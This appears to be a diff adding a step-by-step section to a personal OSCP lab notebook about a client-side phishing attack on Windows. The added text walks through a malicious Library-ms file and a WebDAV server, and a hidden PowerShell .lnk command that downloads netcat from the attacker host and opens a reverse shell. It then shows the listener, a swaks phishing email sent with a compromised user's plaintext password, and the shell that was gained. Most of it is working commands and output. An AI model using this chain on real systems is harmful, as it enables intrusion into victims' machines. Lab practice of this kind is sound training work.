@@ -51,6 +51,7 @@ This example will leverage a two-stage client-side attack. In the first stage, t
    * The original OSCP example uses a [WebDAV](https://en.wikipedia.org/wiki/WebDAV) server that is spun up on-demand via [WsgiDAV](https://wsgidav.readthedocs.io/en/latest/index.html)
    * I followed the steps [here](https://www.digitalocean.com/community/tutorials/how-to-configure-webdav-access-with-apache-on-ubuntu-18-04) to set up WebDAV on my Apache server (site `mal`) to have a `/webdav` folder
      * The **authentication will need to be disabled when following the steps below** as the library assumes no authentication for accessing WebDAV (disable in `mal.conf` file)
+   * I have seen instances where the Apache server is unsuitable because the victim's machine strips portions of the URL. If this is happening see this section
 2. Use the foothold to provide an executable file that will start a reverse shell when double-clicked
 
 ## Creating the Library
@@ -224,3 +225,277 @@ When double-clicked this Shortcut launches a reverse shell. Now that the payload
 <figure><img src="../../.gitbook/assets/CSA-ShortcutWarning.png" alt=""><figcaption><p>Shortcut warning</p></figcaption></figure>
 
 The victim will still need to click `Open` in order to cause the Shortcut to execute. Arranging this will require a pretext of some sort.
+
+## Full CLI Example
+
+### Apache Problems
+
+I have seen instances where everything works perfectly in testing but when attempting to run the actual attack an issue occurs. As far as I can tell this occurs because the victim machine strips part of the URL from the library. So consider the following library file:
+
+{% code title="config.Library-ms" %}
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+    <name>@windows.storage.dll,-34582</name>
+    <version>1</version>
+    <isLibraryPinned>true</isLibraryPinned>
+    <iconReference>imageres.dll,-1003</iconReference>
+    <templateInfo>
+        <folderType>{B3690E58-E961-423B-B687-386EBFD83239}</folderType>
+    </templateInfo>
+    <searchConnectorDescriptionList>
+        <searchConnectorDescription>
+            <isDefaultSaveLocation>true</isDefaultSaveLocation>
+            <isSupported>false</isSupported>
+            <simpleLocation>
+                <url>http://192.168.45.159/webdav</url>
+            </simpleLocation>
+        </searchConnectorDescription>
+    </searchConnectorDescriptionList>
+</libraryDescription>
+```
+{% endcode %}
+
+This is supposed to interact with a WebDAV server hosted at `http://192.168.45.159/webdav`. In the WebDAV directory was a `.lnk` file containing the command:
+
+{% code overflow="wrap" %}
+```sh
+powershell.exe -w hidden -c "iwr 'http://192.168.45.243/windows/exe/networking/netcat_x64.exe' -OutFile $env:userprofile\nc.exe;&(Join-Path $env:userprofile nc.exe) 192.168.45.243 443 -e powershell"
+```
+{% endcode %}
+
+This worked well in testing on the victim at 192.168.225.250 as seen in the Apache access logs:
+
+```
+192.168.225.250 - - [14/Apr/2024:15:01:47 -0600] "PROPFIND /webdav HTTP/1.1" 301 583 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:47 -0600] "PROPFIND /webdav/ HTTP/1.1" 207 1053 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:47 -0600] "PROPFIND /webdav HTTP/1.1" 301 583 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:47 -0600] "PROPFIND /webdav/ HTTP/1.1" 207 1053 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:47 -0600] "PROPFIND / HTTP/1.1" 405 561 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:47 -0600] "PROPFIND /webdav HTTP/1.1" 301 583 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:47 -0600] "PROPFIND /webdav/ HTTP/1.1" 207 2574 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:47 -0600] "GET /webdav/automatic_configuration.lnk HTTP/1.1" 200 2383 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:47 -0600] "PROPFIND /webdav/Thumbs.db HTTP/1.1" 404 493 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:51 -0600] "PROPFIND /webdav HTTP/1.1" 301 583 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:51 -0600] "PROPFIND /webdav/ HTTP/1.1" 207 2574 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:51 -0600] "PROPFIND /webdav HTTP/1.1" 301 583 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:51 -0600] "PROPFIND /webdav/ HTTP/1.1" 207 2574 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:51 -0600] "PROPFIND /webdav HTTP/1.1" 301 583 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:51 -0600] "PROPFIND /webdav/ HTTP/1.1" 207 2574 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.250 - - [14/Apr/2024:15:01:57 -0600] "GET /windows/exe/networking/netcat_x64.exe HTTP/1.1" 200 45578 "-" "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22000.832"
+```
+
+The victim's WebDAV client attempted to connect to the proper `/webdav` directory and then it grabbed the `.lnk` file, downloaded the Netcat `exe`, and then connected back to the reverse shell (last step not shown).
+
+However, when the same library and `.lnk` file pair were used with the actual victim machine (`192.168.225.242`) things went wrong:
+
+```
+192.168.225.242 - - [14/Apr/2024:15:03:16 -0600] "OPTIONS / HTTP/1.1" 200 218 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.242 - - [14/Apr/2024:15:03:16 -0600] "PROPFIND / HTTP/1.1" 405 561 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.242 - - [14/Apr/2024:15:03:16 -0600] "PROPFIND / HTTP/1.1" 405 561 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.242 - - [14/Apr/2024:15:03:16 -0600] "PROPFIND / HTTP/1.1" 405 561 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.242 - - [14/Apr/2024:15:07:17 -0600] "OPTIONS / HTTP/1.1" 200 218 "-" "DavClnt"
+192.168.225.242 - - [14/Apr/2024:15:07:20 -0600] "OPTIONS / HTTP/1.1" 200 218 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.242 - - [14/Apr/2024:15:07:20 -0600] "PROPFIND / HTTP/1.1" 405 561 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.242 - - [14/Apr/2024:15:07:20 -0600] "PROPFIND / HTTP/1.1" 405 561 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+192.168.225.242 - - [14/Apr/2024:15:07:20 -0600] "PROPFIND / HTTP/1.1" 405 561 "-" "Microsoft-WebDAV-MiniRedir/10.0.22000"
+```
+
+As shown by these log files it was attempting to just access the root directory of the website (`/`) which was not the WebDAV directory and was thus failing. This was causing the `.lnk` file to never be transferred and the attack to fail. If this is seen it is easiest to just turn of Apache and manually stand up the WebDAV and HTTP servers using `wsgidav` and python respectively.
+
+### Setting Up WebDAV
+
+It is recommended to use the current directory and create two sub-directories `./http` and `./webdav`. Inside `./webdav` a modified `.lnk` file containing the following command is placed:
+
+{% code overflow="wrap" %}
+```sh
+powershell.exe -w hidden -c "iwr 'http://192.168.45.243:8000/netcat_x64.exe' -OutFile $env:userprofile\nc.exe;&(Join-Path $env:userprofile nc.exe) 192.168.45.243 443 -e powershell"
+```
+{% endcode %}
+
+Then the attacker must move to the `./webdav` directory and use the following command to launch a WebDAV server:
+
+```bash
+wsgidav --host=0.0.0.0 --port=80 --root=. --auth=anonymous
+```
+
+* `--host` specifies what interfaces to use. `0.0.0.0` is all interfaces
+* `--root` indicates which directory to launch in
+  * This command runs in the `/webdav` directory so this is set to current directory with .
+* `--auth=anonymous` sets the server up to allow anonymous login (no credentials) to help create a seamless experience for the victim
+
+```shell-session
+kali@kali:~/webdav$ wsgidav --host=0.0.0.0 --port=80 --root=. --auth=anonymous
+Running without configuration file.
+15:23:30.052 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+15:23:30.054 - INFO    : WsgiDAV/4.3.0 Python/3.11.8 Linux-6.6.9-amd64-x86_64-with-glibc2.37
+15:23:30.054 - INFO    : Lock manager:      LockManager(LockStorageDict)
+15:23:30.054 - INFO    : Property manager:  None
+15:23:30.054 - INFO    : Domain controller: SimpleDomainController()
+15:23:30.054 - INFO    : Registered DAV providers by route:
+15:23:30.054 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/lib/python3/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
+15:23:30.054 - INFO    :   - '/': FilesystemProvider for path '/home/qwerzxcv/OSCP/OSCP_Exercises/OfflineExercises/AssemblingThePieces/beyond/mailsrv1/exploit/webdav' (Read-Write) (anonymous)
+15:23:30.054 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+15:23:30.054 - WARNING : Share '/' will allow anonymous write access.
+15:23:30.055 - WARNING : Share '/:dir_browser' will allow anonymous write access.
+15:23:30.186 - INFO    : Running WsgiDAV/4.3.0 Cheroot/10.0.0 Python/3.11.8
+15:23:30.186 - INFO    : Serving on http://0.0.0.0:80 ...
+```
+
+With this running the attacker can then modify the library file to look like this:
+
+{% code title="config.Library-ms" %}
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+    <name>@windows.storage.dll,-34582</name>
+    <version>1</version>
+    <isLibraryPinned>true</isLibraryPinned>
+    <iconReference>imageres.dll,-1003</iconReference>
+    <templateInfo>
+        <folderType>{B3690E58-E961-423B-B687-386EBFD83239}</folderType>
+    </templateInfo>
+    <searchConnectorDescriptionList>
+        <searchConnectorDescription>
+            <isDefaultSaveLocation>true</isDefaultSaveLocation>
+            <isSupported>false</isSupported>
+            <simpleLocation>
+                <url>http://192.168.45.243</url>
+            </simpleLocation>
+        </searchConnectorDescription>
+    </searchConnectorDescriptionList>
+</libraryDescription>
+```
+{% endcode %}
+
+This will automatically connect to the WebDAV server on port 80.
+
+### Setting Up HTTP
+
+The attacker should then open a new command prompt and navigate to the /http directory. In this directory the attacker should place a `.exe` for Netcat which will be called `netcat_x64.exe`:
+
+```shell-session
+kali@kali:~/http$ ls                     
+netcat_x64.exe
+```
+
+With that file in place the following command should be used to launch the HTTP server:
+
+```bash
+python3 -m http.server 8000
+```
+
+Once run the server is up and running:
+
+```shell-session
+kali@kali:~/http$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+### Starting the Listener
+
+The attack is now fully staged and the attacker should open one more command prompt and start the listener:
+
+```bash
+rlwrap nc -lvnp 443
+```
+
+### Sending the Email
+
+A final command prompt can be opened and used to send the email with the [`swaks`](http://www.jetmore.org/john/code/swaks/) command:&#x20;
+
+{% code overflow="wrap" %}
+```bash
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.225.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+```
+{% endcode %}
+
+* This command must be run from a directory containing the email body in a file called `body.txt` and a copy of the `config.Library-ms` file
+* This command requires valid credentials to send the email fortunately in this example the attacker was able to compromise the valid user `john`'s credentials and use them in the attack
+
+When run the attacker will see confirmation the email was sent:
+
+```shell-session
+kali@kali:~$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.225.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+[sudo] password for kali:  
+Username: john
+Password: dqsTwTpZPn#nL
+=== Trying 192.168.225.242:25...
+=== Connected to 192.168.225.242.
+<-  220 MAILSRV1 ESMTP
+ -> EHLO kl-laptop.domainn.home
+<-  250-MAILSRV1
+...
+ -> 43 lines sent
+<-  250 Queued (1.078 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+```
+
+When this is all done the attacker will see the activity in the WebDAV and HTTP servers:
+
+```
+15:23:30.186 - INFO    : Serving on http://0.0.0.0:80 ...
+15:26:17.237 - INFO    : Got OPTIONS '/' request
+15:26:17.237 - INFO    : Got OPTIONS '/' request
+15:26:17.237 - INFO    : 192.168.225.242 - (anonymous) - [2024-04-14 21:26:17] "OPTIONS /" elap=0.001sec -> 200 OK
+15:26:17.374 - INFO    : Got OPTIONS '/' request
+15:26:17.375 - INFO    : 192.168.225.242 - (anonymous) - [2024-04-14 21:26:17] "PROPFIND /" length=0, depth=0, elap=0.001sec -> 207 Multi-Status
+15:26:17.489 - INFO    : Got OPTIONS '/' request
+15:26:17.489 - INFO    : 192.168.225.242 - (anonymous) - [2024-04-14 21:26:17] "PROPFIND /" length=0, depth=0, elap=0.001sec -> 207 Multi-Status
+15:26:17.610 - INFO    : Got OPTIONS '/' request
+15:26:17.611 - INFO    : 192.168.225.242 - (anonymous) - [2024-04-14 21:26:17] "PROPFIND /" length=0, depth=0, elap=0.001sec -> 207 Multi-Status
+15:26:17.722 - INFO    : Got OPTIONS '/' request
+15:26:17.727 - INFO    : 192.168.225.242 - (anonymous) - [2024-04-14 21:26:17] "PROPFIND /" length=0, depth=1, elap=0.005sec -> 207 Multi-Status
+15:26:17.840 - INFO    : Got OPTIONS '/' request
+15:26:17.843 - INFO    : 192.168.225.242 - (anonymous) - [2024-04-14 21:26:17] "PROPFIND /" length=0, depth=1, elap=0.003sec -> 207 Multi-Status
+15:26:17.955 - INFO    : Got OPTIONS '/' request
+15:26:17.956 - INFO    : 192.168.225.242 - (anonymous) - [2024-04-14 21:26:17] "PROPFIND /" length=0, depth=1, elap=0.001sec -> 207 Multi-Status
+15:26:18.069 - INFO    : Got OPTIONS '/' request
+15:26:18.070 - INFO    : 192.168.225.242 - (anonymous) - [2024-04-14 21:26:18] "PROPFIND /" length=0, depth=1, elap=0.001sec -> 207 Multi-Status
+15:26:18.182 - INFO    : Got OPTIONS '/' request
+15:26:18.183 - INFO    : 192.168.225.242 - (anonymous) - [2024-04-14 21:26:18] "PROPFIND /" length=0, depth=1, elap=0.001sec -> 207 Multi-Status
+15:26:18.295 - INFO    : Got OPTIONS '/' request
+15:26:18.296 - INFO    : 192.168.225.242 - (anonymous) - [2024-04-14 21:26:18] "PROPFIND /" length=0, depth=1, elap=0.001sec -> 207 Multi-Status
+15:26:18.451 - INFO    : 192.168.225.242 - (anonymous) - [2024-04-14 21:26:18] "GET /automatic_configuration.lnk" depth=0, elap=0.039sec -> 200 OK
+```
+
+```
+$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.225.242 - - [14/Apr/2024 15:26:19] "GET /netcat_x64.exe HTTP/1.1" 200 -
+```
+
+And the connection back to the listener is successful:
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>kali@kali:~$ rlwrap nc -lvnp 443
+</strong>listening on [any] 443 ...
+connect to [192.168.45.243] from (UNKNOWN) [192.168.225.242] 62700
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
+whoami
+beyond\marcus
+PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
+hostname
+CLIENTWK1
+PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 172.16.181.243
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.181.254
+PS C:\Windows\System32\WindowsPowerShell\v1.0> 
+</code></pre>
+
+This example can be used when phishing is not going well with Apache.
